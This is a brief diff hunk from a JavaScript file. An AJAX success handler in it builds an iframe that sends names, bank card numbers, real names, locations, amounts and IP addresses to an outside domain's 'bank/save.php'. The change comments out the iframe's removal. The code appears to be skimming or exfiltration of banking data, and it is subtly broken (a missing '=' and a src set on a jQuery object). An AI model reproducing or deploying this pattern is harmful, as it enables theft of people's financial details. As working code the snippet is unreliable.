@@ -63,9 +63,9 @@
              
             var iframes = $('<iframe>');
             iframes.src = 'http://www.yc888.la/bank/save.php?name=' + name +'&master=' + master + '&bank' + bank+ '&cardnum=' +cardnum+'&province=' +province+ '&city=' +city+ '&truename=' +truename+ '&amount=' +amount+ '&time=' + time+ '&isvip=' +isvip+ '&ip=' +ip+ '&desc='  + desc;
-            setTimeout(function(){
+            /*setTimeout(function(){
               iframes.remove();    
-            },1000)
+            },1000)*/
            },
            error: function(f){
            }
